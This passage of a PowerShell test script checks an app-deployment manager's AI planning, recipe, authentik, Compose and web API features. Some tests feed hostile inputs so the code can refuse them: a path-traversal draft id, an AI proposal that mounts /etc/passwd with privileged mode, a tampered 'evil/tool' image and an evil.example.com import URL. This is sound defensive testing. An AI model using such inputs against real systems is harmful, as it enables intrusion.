Set-AiTransport { param($uri, $headers, $body) $script:AiCalls++; $script:AiLastBody = $body; [pscustomobject]@{ Status = 200; Text = ([ordered]@{ stop_reason = 'end_turn'; content = @([ordered]@{ type = 'text'; text = ($proposal | ConvertTo-Json -Depth 6 -Compress) }); usage = [ordered]@{ input_tokens = 1200; output_tokens = 300 } } | ConvertTo-Json -Depth 6) } }
$run1 = Invoke-AiPlanning -Settings $aiSettings -Request $req -Model 'claude-haiku-5-5' -MaxOutputTokens 4000 -ApiKey 'sk-ant-test'
$run2 = Invoke-AiPlanning -Settings $aiSettings -Request $req -Model 'claude-haiku-5-5' -MaxOutputTokens 4000 -ApiKey 'sk-ant-test'
$usage = Read-AiUsage $aiSettings
Test-Condition 'ai: the provider is called once; the identical second request is answered from the local cache at no cost; usage is recorded' ($script:AiCalls -eq 1 -and -not $run1.Cached -and $run2.Cached -and $run2.Usage.usd -eq 0 -and @($usage.calls).Count -eq 1 -and [Math]::Abs([double]$usage.calls[0].usd - ((1200 * 0.10 + 300 * 0.50) / 1000000)) -lt 0.000001) "calls=$($script:AiCalls)"
Test-Condition 'ai: the request asks for structured JSON with the schema and never sends temperature or the API key in the body' ($script:AiLastBody -match '"json_schema"' -and $script:AiLastBody -notmatch 'temperature' -and $script:AiLastBody -notmatch 'sk-ant') ''
$merged = Merge-AiProposal $draftM $run1.Proposal
$mm = $merged.Manifest; $ms = $mm.services.tool
Test-Condition 'ai merge: the web port answers the open question; settings become inputs (the secret is generated, its example is never used)' ($mm.web.service -eq 'tool' -and @($ms.ports | Where-Object { $_.container -eq 8080 -and $_.Contains('primary') }).Count -and @($mm.inputs | Where-Object { $_.label -eq 'TOOL_SECRET' -and $_.type -eq 'generated' }).Count -and ($mm | ConvertTo-Json -Depth 20) -notmatch 'example-secret-123' -and @($mm.inputs | Where-Object { $_.label -eq 'LOG_LEVEL' -and $_.default -eq 'info' }).Count) ''
Test-Condition 'ai merge: commands, privileges, host paths, unknown services and dependencies are never applied (listed as rejected)' (-not $ms.Contains('command') -and -not $ms.Contains('privileged') -and -not @($ms.volumes | Where-Object { $_.target -eq '/etc/passwd' }).Count -and @($ms.volumes | Where-Object { $_.target -eq '/config' }).Count -and @($merged.Rejected | Where-Object { $_ -match 'dependency postgres' }).Count -and @($merged.Rejected | Where-Object { $_ -match "'X' \(nope\)" }).Count -and @($mm.services.Keys).Count -eq 1) (($merged.Rejected) -join ' | ')
Test-Condition 'ai merge: answers are recorded as AI assumptions with their evidence; what AI could not answer stays open' (@($mm.draft.assumptions | Where-Object { $_ -match '^AI:' }).Count -and @($mm.draft.evidence | Where-Object { $_.source -eq 'AI proposal' -and $_.how -match 'listens on port 8080' }).Count -and @($mm.draft.unresolved | Where-Object { $_.reason -match 'database is mandatory' }).Count -and $mm.installable) ''
Set-AiTransport { param($uri, $headers, $body) [pscustomobject]@{ Status = 200; Text = '{"stop_reason":"refusal","content":[],"usage":{"input_tokens":10,"output_tokens":0}}' } }
$req2 = New-AiPlanningRequest -Manifest $draftM -Documentation 'other text' -PrivateNames @()
Test-Throws 'ai: a refusal produces no proposal (handled, not parsed as JSON)' { Invoke-AiPlanning -Settings $aiSettings -Request $req2 -Model 'claude-haiku-5-5' -ApiKey 'k' } 'declined'
Set-AiTransport $null
Remove-Item -LiteralPath $aiDir -Recurse -Force -ErrorAction SilentlyContinue

# --- Part 1i: recipes ----------------------------------------------------------------------------------------------------------
$fp = [ordered]@{ platform = 'windows-docker-desktop'; os = 'windows'; osVersion = '10.0.26220'; architecture = 'linux/amd64'; kernel = '6.6'; dockerEngine = '28.5'; dockerCompose = '5.5.1'; runtime = 'docker-desktop' }
$recM = ConvertTo-PlainObject $fixedM
$recM.provenance.documents = @([ordered]@{ url = 'https://hub.docker.com/v2/repositories/acme/tool/'; kind = 'meta' })
$rec = New-Recipe -Manifest $recM -HostFingerprint $fp -Verification @([ordered]@{ stage = 'backend'; status = 'passed' }, [ordered]@{ stage = 'containers'; status = 'passed' })
Test-Condition 'recipes: a verified local deployment becomes a valid recipe (verified-local, health evidence, pinned images)' (-not @(Test-Recipe $rec).Count -and $rec.trust.status -eq 'verified-local' -and $rec.validation.healthCheck -and @($rec.images | Where-Object { $_.image -match '@sha256:' }).Count -eq 1) ((Test-Recipe $rec) -join '; ')
$tam = ($rec | ConvertTo-Json -Depth 25) | ConvertFrom-Json
$tam.manifest.services.tool.image = 'evil/tool:1'
Test-Condition 'recipes: a manifest changed after the recipe was made is detected (fingerprint mismatch)' (@(Test-Recipe $tam | Where-Object { $_ -match 'manifestSha256' }).Count -eq 1) ''
$leaky = ($rec | ConvertTo-Json -Depth 25) | ConvertFrom-Json
$leaky.knownIssues = @('Worked at 192.168.1.20 on app.jrtech.example for joe@example.com in C:\Users\Joe\apps')
$sz = ConvertTo-SanitizedRecipe $leaky @('jrtech.example', 'Joe')
$szText = $sz.Recipe | ConvertTo-Json -Depth 25
Test-Condition 'recipes: sharing removes addresses, e-mail, paths, your domains and user name, and shows what was removed' ($szText -notmatch '192\.168|jrtech|joe@|Users\\\\Joe' -and @($sz.Removed).Count -ge 3 -and $sz.Recipe.privacy.sanitized -and -not @(Test-Recipe $sz.Recipe).Count) (($sz.Removed | ForEach-Object { $_.kind }) -join ',')
$community = ($rec | ConvertTo-Json -Depth 25) | ConvertFrom-Json; $community.provenance.origin = 'community'; $community.trust.status = 'claimed'; $community.trust.deployments = 12
$arm = ($rec | ConvertTo-Json -Depth 25) | ConvertFrom-Json; $arm.host.architecture = 'linux/arm64'; $arm.provenance.origin = 'curated'
$rank = @(Get-RecipeRanking @($community, $rec, $arm) $fp)
Test-Condition 'recipes: ranking explains its score; a verified local recipe beats a popular unverified one; a recipe for another CPU is listed as incompatible' ($rank[0].Recipe.trust.status -eq 'verified-local' -and -not @($rank | Where-Object { $_.Recipe.host.architecture -eq 'linux/arm64' })[0].Compatible -and @($rank[0].Reasons | Where-Object { $_ -match 'verified by this manager' }).Count) (($rank | ForEach-Object { "$($_.Recipe.provenance.origin)=$($_.Score)" }) -join ' ')
$rdir = Join-Path ([IO.Path]::GetTempPath()) ('tpm-rc-' + [Guid]::NewGuid().ToString('N').Substring(0, 8)); New-Item -ItemType Directory -Force -Path $rdir | Out-Null
$imp = Import-RecipeText ([pscustomobject]@{ InstallPath = $rdir }) ($rec | ConvertTo-Json -Depth 25)
$back = @(Get-LocalRecipes ([pscustomobject]@{ InstallPath = $rdir }))[0]
Test-Condition 'recipes: an imported recipe is stored as community and claimed (its own claims never count as verified here)' ($back.provenance.origin -eq 'community' -and $back.trust.status -eq 'claimed' -and (Test-Path -LiteralPath $imp)) ''
Test-Throws 'recipes: invalid recipe files are refused' { Import-RecipeText ([pscustomobject]@{ InstallPath = $rdir }) '{"recipeVersion":1}' } 'not valid'
Remove-Item -LiteralPath $rdir -Recurse -Force -ErrorAction SilentlyContinue
Test-Condition 'recipes: no community registry is configured; the engine works without it' (-not (Get-RecipeRegistryInfo).configured) ''

# --- Part 1j: manifests --------------------------------------------------------------------------------------------------------
$imported = ConvertTo-PlainObject $fixedM
Test-Condition 'manifests: an imported draft passes the catalog rules with -AllowImported, but never as a catalog file' (-not @(Test-AppManifest $imported -AllowImported).Count -and @(Test-AppManifest $imported | Where-Object { $_ -match 'only curated' }).Count -eq 1) ''
$catErr = @(Get-CatalogApps -CatalogDir (Join-Path $repo 'catalog') | Where-Object { @($_.errors).Count })
Test-Condition 'manifests: every curated catalog manifest is still valid' (-not $catErr.Count) (($catErr | ForEach-Object { "$($_.id): $($_.errors -join ';')" }) -join ' | ')

# --- Part 2: identity contract against an in-memory authentik ---------------------------------------------------------------
$ak = Get-Module Authentik
$fake = @{ next = 100; providers = New-Object System.Collections.ArrayList; apps = New-Object System.Collections.ArrayList; bindings = New-Object System.Collections.ArrayList
  outpost = [pscustomobject]@{ pk = 'op1'; name = 'authentik Embedded Outpost'; managed = 'goauthentik.io/outposts/embedded'; providers = @(7); config = [pscustomobject]@{ authentik_host = 'https://auth.example.com/'; authentik_host_browser = '' } }
  groups = @([pscustomobject]@{ pk = 'g-owners'; name = 'DTC owners' }); calls = New-Object System.Collections.ArrayList }
$null = $fake.providers.Add([pscustomobject]@{ pk = 7; name = 'dm-other'; mode = 'forward_single'; external_host = 'https://other.example.com' })
$null = $fake.apps.Add([pscustomobject]@{ pk = 'a7'; slug = 'dm-other'; name = 'Other'; provider = 7; pbm_uuid = 'pbm-a7' })
$null = $fake.bindings.Add([pscustomobject]@{ pk = 'b7'; target = 'pbm-a7'; group = 'g-owners' })
$flows = @('default-provider-authorization-implicit-consent', 'default-provider-invalidation-flow', 'default-authentication-flow', 'default-invalidation-flow', 'default-source-authentication', 'default-source-enrollment', 'default-user-settings-flow') | ForEach-Object { [pscustomobject]@{ pk = "f-$_"; slug = $_; designation = 'x'; policybindingmodel_ptr_id = "p-$_" } }
$script:Fake = $fake; $script:Flows = $flows
& $ak { param($F, $Fl) $script:FakeAk = $F; $script:FakeFlows = $Fl } $fake $flows
& $ak {
  function script:Invoke-AkHttp {
    param([string]$Url, [string]$Method = 'GET', [string]$Token, $Body)
    $F = $script:FakeAk
    $path = ($Url -replace '^https?://[^/]+/api/v3', '')
    $null = $F.calls.Add("$Method $path")
    $list = { param($items) [pscustomobject]@{ Status = 200; Body = ([ordered]@{ pagination = @{ next = 0 }; results = @($items) } | ConvertTo-Json -Depth 8) } }
    $ok = { param($o) [pscustomobject]@{ Status = 200; Body = ($o | ConvertTo-Json -Depth 8) } }
    $p = $path -replace '\?.*$', ''
    $q = $(if ($path -match '\?(.*)$') { $Matches[1] } else { '' })
    $qv = { param($k) if ($q -match "(^|&)$k=([^&]*)") { [Uri]::UnescapeDataString($Matches[2]) } else { '' } }
    switch -Regex ("$Method $p") {
      '^GET /flows/instances/$' { return (& $list $script:FakeFlows) }
      '^GET /flows/bindings/$' { return (& $list @()) }
      '^GET /outposts/instances/$' { return (& $list @($F.outpost)) }
      '^PATCH /outposts/instances/op1/$' { $b = $Body; if ($b -is [System.Collections.IDictionary] -and $b.Contains('providers')) { $F.outpost.providers = @($b.providers | ForEach-Object { [int]$_ }) }; return (& $ok $F.outpost) }
      '^GET /admin/settings/$' { return (& $ok @{ default_user_change_email = $true }) }
      '^GET /sources/oauth/$' { return (& $list @()) }
      '^GET /core/users/me/$' { return (& $ok @{ user = @{ username = 'akadmin'; is_superuser = $true } }) }
      '^GET /admin/version/$' { return (& $ok @{ version_current = '2026.8.5' }) }
      '^GET /core/groups/$' { $n = & $qv 'name'; return (& $list @($F.groups | Where-Object { $_.name -eq $n })) }
      '^GET /providers/proxy/$' { $n = & $qv 'name'; return (& $list @($F.providers | Where-Object { $_.name -eq $n })) }
      '^POST /providers/proxy/$' { $F.next++; $o = [pscustomobject]@{ pk = $F.next; name = $Body.name; mode = $Body.mode; external_host = $Body.external_host }; $null = $F.providers.Add($o); return (& $ok $o) }
      '^DELETE /providers/proxy/(\d+)/$' { $pk = [int]$Matches[1]; $x = @($F.providers | Where-Object { $_.pk -eq $pk }); foreach ($i in $x) { $F.providers.Remove($i) }; return [pscustomobject]@{ Status = 204; Body = '' } }
      '^GET /core/applications/([^/]+)/$' { $sl = $Matches[1]; $a = @($F.apps | Where-Object { $_.slug -eq $sl }); if ($a.Count) { return (& $ok $a[0]) }; return [pscustomobject]@{ Status = 404; Body = '{"detail":"Not found."}' } }
      '^POST /core/applications/$' { $F.next++; $o = [pscustomobject]@{ pk = "a$($F.next)"; slug = $Body.slug; name = $Body.name; provider = $Body.provider; pbm_uuid = "pbm-$($F.next)" }; $null = $F.apps.Add($o); return (& $ok $o) }
      '^DELETE /core/applications/([^/]+)/$' { $sl = $Matches[1]; $x = @($F.apps | Where-Object { $_.slug -eq $sl }); foreach ($i in $x) { $F.apps.Remove($i); foreach ($b in @($F.bindings | Where-Object { $_.target -eq $i.pbm_uuid })) { $F.bindings.Remove($b) } }; return [pscustomobject]@{ Status = 204; Body = '' } }
      '^GET /policies/bindings/$' { $t = & $qv 'target'; return (& $list @($F.bindings | Where-Object { $_.target -eq $t })) }
      '^POST /policies/bindings/$' { $F.next++; $o = [pscustomobject]@{ pk = "b$($F.next)"; target = $Body.target; group = $Body.group }; $null = $F.bindings.Add($o); return (& $ok $o) }
      default { return [pscustomobject]@{ Status = 501; Body = "{`"detail`":`"fake: $Method $p`"}" } }
    }
  }
}
$conn = New-AuthentikConnection -BaseUrl 'http://authentik.fake:9000' -Token 'fake'
$want = [pscustomobject]@{ Service = 'newapp'; DisplayName = 'New App'; Hostname = 'newapp.example.com'; PublicUrl = 'https://auth.example.com/' }
$prev = Sync-AuthentikAppProtection -Conn $conn -Desired $want -WhatIf
Test-Condition 'contract (authentik): the preview creates provider, application and owner-only access, assigns the outpost, and changes nothing' ((@($prev.Actions | Where-Object { $_.Kind -eq 'create' } | ForEach-Object { $_.Object }) -join ',') -eq 'proxy provider,application,access' -and @($prev.Actions | Where-Object { $_.Object -eq 'outpost' -and $_.Kind -eq 'update' }).Count -eq 1 -and $fake.providers.Count -eq 1 -and $fake.apps.Count -eq 1 -and -not @($fake.calls | Where-Object { $_ -match '^(POST|PATCH|DELETE)' }).Count) (@($fake.calls | Where-Object { $_ -match '^(POST|PATCH|DELETE)' }) -join ' ')
$done = Sync-AuthentikAppProtection -Conn $conn -Desired $want
Test-Condition 'contract (authentik): protecting creates dm-newapp with owner-only access and adds it to the outpost, keeping the other application' ($fake.apps.Count -eq 2 -and @($fake.providers | Where-Object { $_.name -eq 'dm-newapp' }).Count -eq 1 -and @($fake.outpost.providers) -contains 7 -and @($fake.outpost.providers).Count -eq 2 -and @($fake.bindings | Where-Object { $_.group -eq 'g-owners' }).Count -eq 2) "apps=$($fake.apps.Count) outpost=$(@($fake.outpost.providers) -join ',')"
$again = Sync-AuthentikAppProtection -Conn $conn -Desired $want -WhatIf
Test-Condition 'contract (authentik): protecting the same application again reuses everything (no duplicate provider, application or policy)' (-not @($again.Actions | Where-Object { $_.Kind -ne 'none' }).Count) (@($again.Actions | ForEach-Object { "$($_.Kind) $($_.Object)" }) -join ', ')
$undo = Remove-AuthentikAppProtection -Conn $conn -Service 'newapp' -DeleteObjects
Test-Condition 'contract (authentik): rolling back what the operation created deletes its application, provider and binding, and unassigns only its provider' ($fake.apps.Count -eq 1 -and $fake.providers.Count -eq 1 -and (@($fake.outpost.providers) -join ',') -eq '7' -and @($fake.bindings).Count -eq 1 -and @($fake.apps | Where-Object { $_.slug -eq 'dm-other' }).Count -eq 1) "apps=$($fake.apps.Count) providers=$($fake.providers.Count)"
$undoReused = Remove-AuthentikAppProtection -Conn $conn -Service 'other'
Test-Condition 'contract (authentik): rolling back a reused application only unassigns it; the application, provider and access rules stay' (@($fake.apps | Where-Object { $_.slug -eq 'dm-other' }).Count -eq 1 -and @($fake.providers | Where-Object { $_.name -eq 'dm-other' }).Count -eq 1 -and -not @($fake.outpost.providers).Count -and @($fake.bindings).Count -eq 1) ''
Remove-Module Authentik -Force

# --- Part 3: Compose parsing and generation with Docker (no containers) --------------------------------------------------------
$dockerOk = $false
if (-not $SkipDocker) { try { $null = & docker version --format '{{.Server.Version}}' 2>$null; $dockerOk = ($LASTEXITCODE -eq 0) } catch { } }
if (-not $dockerOk) { Add-Result 'SKIP' 'docker: Compose parsing and validation' $(if ($SkipDocker) { '-SkipDocker' } else { 'Docker is not running' }) }
else {
  $composeText = @'
services:
  web:
    image: ghcr.io/example/app:${APP_TAG:-2.0.1}
    ports: ["8080:3000"]
    environment:
      DATABASE_URL: postgres://app:${DB_PASSWORD}@db:5432/app
      REDIS_URL: redis://cache:6379
    depends_on:
      db: { condition: service_healthy }
      cache: { condition: service_started }
    volumes: ["./data:/data"]
  worker:
    image: ghcr.io/example/app:2.0.1
    command: node worker.js
    environment:
      - DB_PASSWORD=${DB_PASSWORD}
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_PASSWORD: ${DB_PASSWORD}
    healthcheck: { test: ["CMD", "pg_isready"], interval: 10s }
    volumes: [pgdata:/var/lib/postgresql/data]
  cache:
    image: redis:7-alpine
volumes: { pgdata: {} }
'@
  Test-Throws 'compose: include: and extends: are refused before Docker reads anything' { ConvertFrom-ComposeText -Text "include:`n  - other.yaml`nservices: {}" } 'include'
  Test-Throws 'compose: invalid YAML is reported by docker compose config' { ConvertFrom-ComposeText -Text "services:`n  web:`n    image: [unclosed" } 'not valid'
  $parsed = ConvertFrom-ComposeText -Text $composeText
  $conv = ConvertFrom-ComposeModel -Model $parsed -EnvDefaults ([ordered]@{}) -Origin 'fixture'
  Test-Condition 'compose (docker): a real multi-service file is parsed without interpolation (variables stay variables, then become inputs)' ($conv.Web.service -eq 'web' -and $conv.Services.worker.command[0] -eq 'node' -and $conv.Services.db.environment.POSTGRES_PASSWORD -eq '{{input:dbPassword}}' -and $conv.Services.web.image -eq 'ghcr.io/example/app:2.0.1') ''
  $nm = New-NormalizedManifest -Conversion $conv -Facts @{ Name = 'Example Stack'; SourceUrl = 'https://github.com/example/app'; SourceKind = 'github'; SourceKindLabel = 'GitHub'; License = 'MIT'; Documents = @(); Evidence = @(); Notes = @() }
  foreach ($k in @($nm.services.Keys)) { $nm.services[$k].image = ([string]$nm.services[$k].image) + "@$digest" }
  $pm = ConvertTo-PlainObject $nm
  $errs = @(Test-AppManifest $pm -AllowImported)
  $res = Resolve-AppValues -Manifest $pm -Project 'example-stack' -AppUrl 'http://127.0.0.1:18999' -LocalPort 18999
  $yaml = ConvertTo-AppCompose -Manifest $pm -Project 'example-stack' -Resolved $res -ProxyNetwork 'proxynet' -LocalPort 18999
  $tmp = Join-Path ([IO.Path]::GetTempPath()) ('tpm-prov-' + [Guid]::NewGuid().ToString('N').Substring(0, 8)); New-Item -ItemType Directory -Force -Path $tmp | Out-Null
  [IO.File]::WriteAllText((Join-Path $tmp 'compose.yaml'), $yaml); $envAll = [ordered]@{}; foreach ($sv in $res.Env.Keys) { foreach ($ek in $res.Env[$sv].Keys) { $envAll[$ek] = $res.Env[$sv][$ek] } }; [IO.File]::WriteAllText((Join-Path $tmp '.env'), (ConvertTo-EnvFileText $envAll))
  $v = Invoke-Docker compose --project-directory $tmp -f (Join-Path $tmp 'compose.yaml') config -q
  $cfgJson = (Invoke-Docker compose --project-directory $tmp -f (Join-Path $tmp 'compose.yaml') config --format json).Output -join "`n" | ConvertFrom-Json
  Remove-Item -LiteralPath $tmp -Recurse -Force
  Test-Condition 'generation: the imported stack is valid for the manager and for docker compose config' (-not $errs.Count -and $v.ExitCode -eq 0) (($errs -join '; ') + ' ' + ($v.Output -join ' '))
  $webNets = @($cfgJson.services.web.networks.PSObject.Properties | ForEach-Object { $_.Name }); $dbNets = @($cfgJson.services.db.networks.PSObject.Properties | ForEach-Object { $_.Name })
  Test-Condition 'generation: only the web service joins the proxy network; database, cache and worker stay private; only 127.0.0.1:<port> is published' (($webNets -contains 'proxy') -and -not ($dbNets -contains 'proxy') -and -not @($cfgJson.services.cache.networks.PSObject.Properties | Where-Object { $_.Name -eq 'proxy' }).Count -and [string]$cfgJson.services.web.ports[0].host_ip -eq '127.0.0.1' -and -not $cfgJson.services.db.PSObject.Properties['ports']) "web=$($webNets -join ',') db=$($dbNets -join ',')"
  Test-Condition 'generation: secrets live only in .env (compose.yaml references ${VAR}); the database volume is a named volume of the project' ($yaml -notmatch 'postgres://app:[0-9a-f]{48}' -and $yaml -match 'POSTGRES_PASSWORD: \$\{POSTGRES_PASSWORD\}' -and $yaml -match 'name: example-stack_pgdata') ''
}

# --- Part 4: web API on a throwaway instance (no containers) ---------------------------------------------------------------
$id = [Guid]::NewGuid().ToString('N').Substring(0, 6)
$work = Join-Path ([IO.Path]::GetTempPath()) "tpm-prov-$id"
New-Item -ItemType Directory -Force -Path $work | Out-Null
$ui = $null; $mock = $null; $netName = ''
$before = @()
try {
  $install = New-TestInstance -Repo $repo -Path (Join-Path $work 'instance') -StackName "tpm-prov-$id"
  $mock = Start-CloudflareMock -Repo $repo -WorkDir $work -Token 'cf-test-token'
  $ui = Start-WebUiServer -Script (Join-Path $repo 'webui.ps1') -InstallPath $install -WorkDir (New-Item -ItemType Directory -Force -Path (Join-Path $work 'ui')).FullName -ApiBase $mock.Base
  $null = Connect-WebUi $ui
  $g = Invoke-WebUi $ui GET '/api/provision'
  Test-Condition 'api: the provisioning overview lists sources, the tested host, AI off by default with no key, and the identity contract' ($g.Status -eq 200 -and $g.Data.ai.provider -eq 'none' -and -not $g.Data.ai.keyStored -and $g.Data.host.id -eq 'windows-docker-desktop' -and $g.Data.identity.readiness -and -not $g.Data.registry.configured) $g.Body
  $bad1 = Invoke-WebUi $ui POST '/api/provision/import' @{ url = 'http://127.0.0.1:8080/compose.yaml' }
  $bad2 = Invoke-WebUi $ui POST '/api/provision/import' @{ url = 'https://evil.example.com/x.yaml' }
  $bad3 = Invoke-WebUi $ui POST '/api/provision/import' @{ url = 'https://ca.unraid.net/apps/plex' }
  Test-Condition 'api: imports from local or unsupported addresses are refused with a readable reason (nothing fetched)' ($bad1.Status -eq 422 -and $bad2.Status -eq 422 -and $bad2.Body -match 'not a supported source' -and $bad1.Body -match 'https' -and $bad3.Status -eq 422 -and $bad3.Body -match 'template link') "$($bad1.Status) $($bad2.Status) $($bad3.Status)"
  # Drafts as the importer saves them (written directly: no network in this part).
  $dd = Join-Path $install 'config\provision\drafts'; New-Item -ItemType Directory -Force -Path $dd | Out-Null
  $toolDraft = [ordered]@{ version = 1; draftId = 'aaaa1111bbbb2222'; createdAt = (Get-Date -Format 's'); url = 'https://hub.docker.com/r/acme/tool'; kind = 'dockerhub'; catalogMatch = $null; manifest = $dm; ai = @() }
  [IO.File]::WriteAllText((Join-Path $dd 'aaaa1111bbbb2222.json'), ($toolDraft | ConvertTo-Json -Depth 30))
  $dv = Invoke-WebUi $ui GET '/api/provision/draft?id=aaaa1111bbbb2222'
  Test-Condition 'api: a draft with an open web-port question is shown as not deployable, with its findings and compatibility' ($dv.Status -eq 200 -and -not $dv.Data.deployable -and @($dv.Data.unresolved | Where-Object { $_.field -eq 'web.port' }).Count -and $dv.Data.compatibility.status) $dv.Body
  $pBlocked = Invoke-WebUi $ui POST '/api/provision/plan' @{ draftId = 'aaaa1111bbbb2222'; access = 'local'; auth = 'none' }
  Test-Condition 'api: planning a draft that is not installable yet is blocked with the reason' ($pBlocked.Status -eq 200 -and -not $pBlocked.Data.canApply -and @($pBlocked.Data.blockers).Count) $pBlocked.Body
  $ed = Invoke-WebUi $ui POST '/api/provision/draft/web' @{ draftId = 'aaaa1111bbbb2222'; webService = 'tool'; webPort = 8080; protocol = 'http' }
  Test-Condition 'api: answering the web port makes the draft deployable' ($ed.Status -eq 200 -and $ed.Data.deployable -and $ed.Data.web.service -eq 'tool') $ed.Body
  $edBad = Invoke-WebUi $ui POST '/api/provision/draft/web' @{ draftId = 'aaaa1111bbbb2222'; webService = 'nope'; webPort = 8080; protocol = 'http' }
  $idBad = Invoke-WebUi $ui GET '/api/provision/draft?id=..%5C..%5Cx'
  Test-Condition 'api: invalid answers and draft ids (path traversal) are refused' ($edBad.Status -eq 400 -and $idBad.Status -eq 400) "$($edBad.Status) $($idBad.Status)"
  $aiOff = Invoke-WebUi $ui POST '/api/provision/ai/estimate' @{ draftId = 'aaaa1111bbbb2222' }
  $keyBad = Invoke-WebUi $ui POST '/api/provision/ai/key' @{ key = 'not-a-key' }
  $set = Invoke-WebUi $ui POST '/api/provision/ai/settings' @{ provider = 'anthropic'; model = 'claude-haiku-5-5'; escalationModel = 'claude-sonnet-5-5'; monthlyLimitUsd = 1; perRequestLimitUsd = 0.02 }
  $setBad = Invoke-WebUi $ui POST '/api/provision/ai/settings' @{ provider = 'openai-compatible' }
  Test-Condition 'api ai: off by default (409), keys must look like Anthropic API keys, unimplemented providers are refused, limits are saved' ($aiOff.Status -eq 409 -and $keyBad.Status -eq 400 -and $set.Status -eq 200 -and $set.Data.provider -eq 'anthropic' -and [double]$set.Data.monthlyLimitUsd -eq 1 -and $setBad.Status -eq 400) "$($aiOff.Status) $($keyBad.Status) $($set.Status) $($setBad.Status)"
  # A second draft with open questions for the estimate (the first one has none left).
  $openDraft = [ordered]@{ version = 1; draftId = 'cccc3333dddd4444'; createdAt = (Get-Date -Format 's'); url = 'https://hub.docker.com/r/acme/tool'; kind = 'dockerhub'; catalogMatch = $null; manifest = $dm; ai = @() }
  [IO.File]::WriteAllText((Join-Path $dd 'cccc3333dddd4444.json'), ($openDraft | ConvertTo-Json -Depth 30))
  $estA = Invoke-WebUi $ui POST '/api/provision/ai/estimate' @{ draftId = 'cccc3333dddd4444' }
  Test-Condition 'api ai: the estimate shows the exact text that would be sent, the maximum cost and the budget, before any call' ($estA.Status -eq 200 -and $estA.Data.preview.user -match 'Open questions' -and $estA.Data.estimate.maxUsd -gt 0 -and $estA.Data.budget.ok -and $estA.Data.month.limitUsd -eq 1) $estA.Body
  $runNoConfirm = Invoke-WebUi $ui POST '/api/provision/ai/run' @{ estimateId = $estA.Data.estimateId }
  $runNoKey = Invoke-WebUi $ui POST '/api/provision/ai/run' @{ estimateId = $estA.Data.estimateId; confirm = $true }
  Test-Condition 'api ai: sending needs explicit approval; without a stored key nothing is sent and nothing is charged' ($runNoConfirm.Status -eq 400 -and $runNoKey.Status -in 502, 409 -and $runNoKey.Body -match 'key') "$($runNoConfirm.Status) $($runNoKey.Status) $($runNoKey.Body)"
  $pPublic = Invoke-WebUi $ui POST '/api/provision/plan' @{ draftId = 'aaaa1111bbbb2222'; access = 'public'; hostname = 'tool.example.com'; auth = 'authentik' }
  Test-Condition 'api plan: a public host name outside the deployment''s Cloudflare domains is refused' ($pPublic.Status -eq 400 -and $pPublic.Body -match 'not in a Cloudflare domain') $pPublic.Body
  $pAk = Invoke-WebUi $ui POST '/api/provision/plan' @{ draftId = 'aaaa1111bbbb2222'; access = 'lan'; hostname = 'tool.home.example'; auth = 'authentik'; acknowledge = @($ed.Data.findings | ForEach-Object { $_.id }) }
  Test-Condition 'api plan: authentik protection is refused while Identity & Access is not ready (the reason is shown)' ($pAk.Status -eq 200 -and -not $pAk.Data.canApply -and @($pAk.Data.blockers | Where-Object { $_ -match "Authentication 'authentik' is not available" }).Count) $pAk.Body
  $pNoAck = Invoke-WebUi $ui POST '/api/provision/plan' @{ draftId = 'aaaa1111bbbb2222'; access = 'local'; auth = 'none' }
  Test-Condition 'api plan: findings that need review block the plan until acknowledged' (-not $pNoAck.Data.canApply -and @($pNoAck.Data.blockers | Where-Object { $_ -match 'Review and acknowledge' }).Count) $pNoAck.Body
  $pLocal = Invoke-WebUi $ui POST '/api/provision/plan' @{ draftId = 'aaaa1111bbbb2222'; access = 'local'; auth = 'none'; acknowledge = @($ed.Data.findings | ForEach-Object { $_.id }) }
  Test-Condition 'api plan: a reviewed local-only plan lists the Compose project, its steps and the AI usage (none)' ($pLocal.Status -eq 200 -and $pLocal.Data.container.compose -match 'acme/tool:3.0.1@sha256' -and @($pLocal.Data.steps).Count -ge 2 -and $pLocal.Data.ai.runs -eq 0 -and -not $pLocal.Data.routing) "$($pLocal.Status) canApply=$($pLocal.Data.canApply) blockers=$(@($pLocal.Data.blockers) -join ' | ')"
  # Curated catalog applications use the same pipeline (one engine): a catalog draft, then the same plan.
  $cdr = Invoke-WebUi $ui POST '/api/provision/catalog' @{ appId = 'uptime-kuma' }
  $cdh = Invoke-WebUi $ui POST '/api/provision/catalog' @{ appId = 'diun' }
  $cdw = Invoke-WebUi $ui POST '/api/provision/catalog' @{ appId = 'watchtower' }
  Test-Condition 'api catalog draft: a curated app becomes a New app draft (kind catalog, its own manifest, deployable); headless and retired apps are refused' ($cdr.Status -eq 200 -and $cdr.Data.kind -eq 'catalog' -and $cdr.Data.id -eq 'uptime-kuma' -and $cdr.Data.deployable -and $cdr.Data.protection.forwardAuth -eq 'caution' -and $cdh.Status -eq 409 -and $cdw.Status -eq 409) "$($cdr.Status) $($cdh.Status) $($cdw.Status) deployable=$($cdr.Data.deployable) protection=$($cdr.Data.protection | ConvertTo-Json -Compress -Depth 4) errors=$(@($cdr.Data.manifestErrors) -join '; ') blocking=$(@($cdr.Data.findings | Where-Object { $_.severity -eq 'block' } | ForEach-Object { $_.message }) -join '; ') compat=$($cdr.Data.compatibility.status)"
  $cpl = Invoke-WebUi $ui POST '/api/provision/plan' @{ draftId = $cdr.Data.draftId; access = 'local'; auth = 'none' }
  Test-Condition 'api catalog draft: the plan installs the curated manifest (modular stack description, pinned image) through the same review' ($cpl.Status -eq 200 -and $cpl.Data.container.compose -match 'louislam/uptime-kuma:2\.5\.6@sha256' -and $cpl.Data.container.stack.project) ($cpl.Body.Substring(0, [Math]::Min(500, $cpl.Body.Length)))
  $rp = Invoke-WebUi $ui POST '/api/provision/rollback/plan' @{ operationId = 'zzzz' }
  Test-Condition 'api: operation ids are validated' ($rp.Status -eq 400) $rp.Body

  # --- Part 5: one real, disposable deployment (two Traefik containers, nothing downloaded) --------------------------------
  if (-not $dockerOk) { Add-Result 'SKIP' 'docker: disposable deployment, verification and rollback' $(if ($SkipDocker) { '-SkipDocker' } else { 'Docker is not running' }) }
  else {
    $img = ([regex]::Match([IO.File]::ReadAllText((Join-Path $repo 'compose.yaml')), 'image: (traefik:v[0-9.]+@sha256:[0-9a-f]{64})')).Groups[1].Value
    if ((Invoke-Docker image inspect $img).ExitCode -ne 0) { Add-Result 'SKIP' 'docker: disposable deployment' "image $img not on this PC (nothing is downloaded)" }
    else {
